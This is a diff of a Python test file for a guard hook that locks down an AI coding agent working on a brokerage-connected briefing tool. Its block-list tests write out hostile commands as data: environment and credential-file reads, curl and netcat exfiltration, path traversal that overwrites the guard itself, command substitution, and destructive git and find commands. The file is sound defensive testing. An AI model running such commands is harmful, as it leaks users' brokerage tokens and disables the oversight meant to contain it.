@@ -222,24 +222,25 @@ LOCK = {"CHEEZ_LONGBRIDGE_OAUTH": json.dumps({"client_id": "c", "access_token": 
                                               "refresh_token": "R" * 40})}
 
 
-def test_guard_always_blocks_mutating_calls_even_in_development():
-    ok, _ = guard.decide("Bash", {"command": f"python -c 'ctx.{SUBMIT}(sym)'"}, {})
-    assert not ok
-    ok, _ = guard.decide("Write", {"file_path": "x.py", "content": f"trade.{SUBMIT}(...)"}, {})
-    assert not ok
-    ok, _ = guard.decide("Bash", {"command": "pytest -q"}, {})  # ordinary development is unaffected
-    assert ok
+def test_guard_in_development_blocks_only_real_mutating_code():
+    call = f"ctx.{SUBMIT}(sym)"
+    assert not guard.decide("Bash", {"command": f"python -c '{call}'"}, {})[0]
+    assert not guard.decide("Write", {"file_path": str(ROOT / "src/cheez/x.py"), "content": call}, {})[0]
+    # tests, docs and ordinary commands are not obstructed during development
+    assert guard.decide("Write", {"file_path": str(ROOT / "docs/x.md"), "content": call}, {})[0]
+    assert guard.decide("Bash", {"command": "pytest -q"}, {})[0]
 
 
 @pytest.mark.parametrize("cmd", [
-    "cheez prepare --trigger scheduled",
-    "python -m cheez check",
-    "cheez add-stocks NVDA AMD",
-    "pip install -e '.[brokerage]' -q",
-    "cd /home/user/cheez && cheez render",
-    "git fetch origin claude/cheez-daily-briefing-1ce5zf",
-    "cheez render 2>&1",
-    "ls var/editions",
+    "git fetch origin claude/cheez-daily-briefing-1ce5zf && git checkout claude/cheez-daily-briefing-1ce5zf",
+    "python3 -m venv .venv && .venv/bin/pip install -q -e '.[brokerage]'",
+    ".venv/bin/cheez prepare --trigger scheduled",
+    ".venv/bin/cheez add-stocks NVDA BRK.B",
+    ".venv/bin/cheez check 2>&1",
+    ".venv/bin/cheez refresh",
+    ".venv/bin/cheez render --closed",
+    '.venv/bin/cheez fail "research budget spent; editorial failed validation"',
+    '.venv/bin/cheez render --market-only "data provider down"',
 ])
 def test_lockdown_allows_the_edition_workflow(cmd):
     ok, why = guard.decide("Bash", {"command": cmd}, LOCK)
@@ -247,43 +248,44 @@ def test_lockdown_allows_the_edition_workflow(cmd):
 
 
 @pytest.mark.parametrize("cmd", [
-    "env",
-    "printenv CHEEZ_LONGBRIDGE_OAUTH",
-    "echo $CHEEZ_LONGBRIDGE_OAUTH",
-    "cat /proc/self/environ",
-    "python -c 'import os; print(os.environ)'",
-    "python3 script.py",
-    "curl https://example.com",
-    "cheez prepare; curl https://example.com",
-    "cheez status | nc host 80",
-    "bash -c 'cheez status'",
-    "node -e 1",
-    "find var -maxdepth 0 -exec python3 var/x.json +",
-    "find . -delete",
-    "python -m pytest -p var.evil",
-    "grep -r token /proc/self/environ",
-    "cat /root/.ccr/ca-bundle.crt",
-    "cat /root/.claude/.credentials.json",
+    "env", "printenv CHEEZ_LONGBRIDGE_OAUTH", "echo $CHEEZ_LONGBRIDGE_OAUTH", "cat /proc/self/environ",
+    "python -c 'import os; print(os.environ)'", "python3 script.py", "curl https://example.com",
+    ".venv/bin/cheez prepare; curl https://example.com", ".venv/bin/cheez status | nc host 80", "bash -c 'ls'",
+    "node -e 1", "find var -maxdepth 0 -exec python3 var/x.json +", "find . -delete", "python -m pytest -p var.evil",
+    # reproduced by the independent review
+    "cd / && cat proc/self/environ", "cd /proc && cat self/environ", "cat /pro*/self/environ", "cat /dev/fd/../environ",
+    "cp var/x.txt var/../.claude/hooks/guard.py", "mkdir -p var/../../outside", "cd var && python -m cheez",
+    ". .venv/bin/activate", "cd var && pip install .", "git diff --output .claude/hooks/guard.py", "git checkout -- .",
+    "git checkout HEAD .claude/hooks/guard.py", "git branch -D main", "cat /tmp/cheez-lb-*/.longbr*/openapi/tokens/*",
+    "grep -r refresh /tmp/cheez-lb-x", "python -m cheez check", ".venv/bin/cheez demo",
+    ".venv/bin/cheez prepare --state-from /proc/self/environ", ".venv/bin/cheez add-stocks $(id)",
 ])
 def test_lockdown_blocks_everything_else(cmd):
     ok, _ = guard.decide("Bash", {"command": cmd}, LOCK)
     assert not ok, cmd
 
 
-def test_lockdown_write_read_fetch_rules(tmp_path, monkeypatch):
+def test_lockdown_file_rules_use_resolved_paths(monkeypatch):
     monkeypatch.setenv("CLAUDE_PROJECT_DIR", str(ROOT))
-    assert guard.decide("Write", {"file_path": str(ROOT / "var/editions/x/editorial.json"), "content": "{}"}, LOCK)[0]
-    assert not guard.decide("Write", {"file_path": str(ROOT / "src/cheez/evil.py"), "content": ""}, LOCK)[0]
-    assert not guard.decide("Write", {"file_path": str(ROOT / "var/run.py"), "content": ""}, LOCK)[0]
-    assert not guard.decide("Read", {"file_path": "/proc/self/environ"}, LOCK)[0]
-    assert not guard.decide("WebFetch", {"url": "https://openapi.longbridge.com/v1/asset/stock"}, LOCK)[0]
-    assert not guard.decide("WebFetch", {"url": "https://x.example/?q=" + "A" * 40 + "tokentail"}, LOCK)[0]
-    assert not guard.decide("WebSearch", {"query": "R" * 30}, LOCK)[0]
-    assert not guard.decide("mcp__Gmail__send_message", {"to": "a@b.c"}, LOCK)[0]
-    assert guard.decide("WebSearch", {"query": "semiconductor equipment orders November 2026"}, LOCK)[0]
+    ok = lambda t, i: guard.decide(t, i, LOCK)[0]  # noqa: E731
+    assert ok("Write", {"file_path": str(ROOT / "var/editions/x/editorial.json"), "content": "{}"})
+    assert not ok("Write", {"file_path": str(ROOT / "src/cheez/evil.py"), "content": ""})
+    assert not ok("Write", {"file_path": str(ROOT / "var/run.py"), "content": ""})
+    assert not ok("Write", {"file_path": "var/../.claude/hooks/guard.py", "content": ""})
+    assert not ok("Read", {"file_path": "/proc/self/environ"})
+    assert not ok("Read", {"file_path": "/dev/fd/../environ"})
+    assert not ok("Read", {"file_path": "/tmp/cheez-lb-home-x/.longbridge/openapi/tokens/c"})
+    assert ok("Read", {"file_path": str(ROOT / "src/cheez/cli.py")})
+    assert not ok("Grep", {"pattern": "x", "path": "/proc"})
+    assert not ok("Glob", {"pattern": "../../**"})
+    assert not ok("WebFetch", {"url": "https://openapi.longbridge.com/v1/asset/stock"})
+    assert not ok("WebFetch", {"url": "https://x.example/?q=" + "A" * 40 + "tokentail"})
+    assert not ok("WebSearch", {"query": "R" * 30})
+    assert not ok("mcp__Gmail__send_message", {"to": "a@b.c"})
+    assert ok("WebSearch", {"query": "semiconductor equipment orders November 2026"})
 
 
-def test_guard_script_blocks_via_exit_code_2():
+def test_guard_script_blocks_via_exit_code_2_and_hook_fails_closed():
     payload = json.dumps({"tool_name": "Bash", "tool_input": {"command": "printenv"}})
     env = dict(os.environ, **LOCK)
     r = subprocess.run([sys.executable, str(ROOT / ".claude/hooks/guard.py")], input=payload, text=True,
@@ -294,6 +296,39 @@ def test_guard_script_blocks_via_exit_code_2():
     r = subprocess.run([sys.executable, str(ROOT / ".claude/hooks/guard.py")], input=payload, text=True,
                        capture_output=True, env=env)
     assert r.returncode == 0
+    cmd = json.loads((ROOT / ".claude/settings.json").read_text())["hooks"]["PreToolUse"][0]["hooks"][0]["command"]
+    assert cmd.endswith("|| exit 2")  # a missing or crashing guard blocks the call
+
+
+def test_proxy_does_not_expose_the_raw_context():
+    class T:
+        def account_balance(self):
+            return "ok"
+
+    setattr(T, SUBMIT, lambda self: "MUTATED")
+    p = readonly.ReadOnlyProxy(T(), readonly.TRADE_READ_ALLOW, "TradeContext")
+    assert p.account_balance() == "ok"
+    for attr in ("_target", "_call", "_allow"):
+        with pytest.raises(readonly.ReadOnlyViolation):
+            getattr(p, attr)
+    assert not hasattr(p.account_balance, "__self__")
+
+
+@pytest.mark.parametrize("raw", ["null", "[]", '"just-a-string"', "123", '{"client_id": "../x", "access_token": "a", "refresh_token": "r"}'])
+def test_malformed_credentials_degrade_instead_of_crashing(raw):
+    from cheez.brokerage.longbridge import fetch_snapshot
+
+    chk = check_boundary({"CHEEZ_LONGBRIDGE_OAUTH": raw}, NOW)
+    assert not chk.ok
+    snap = fetch_snapshot(NOW, env={"CHEEZ_LONGBRIDGE_OAUTH": raw})
+    assert snap.status == "error" and snap.messages
+
+
+def test_scope_field_cannot_hide_a_broader_jwt_grant():
+    tok = {"client_id": "c", "scope": "account.read", "access_token": _jwt({"scope": "account.read trade.read trade.write"}),
+           "refresh_token": "r" * 20, "expires_at": int((NOW + timedelta(days=9)).timestamp())}
+    chk = check_boundary({"CHEEZ_LONGBRIDGE_OAUTH": json.dumps(tok)}, NOW)
+    assert not chk.ok
 
 
 # ------------------------------------------------- one-time authorisation
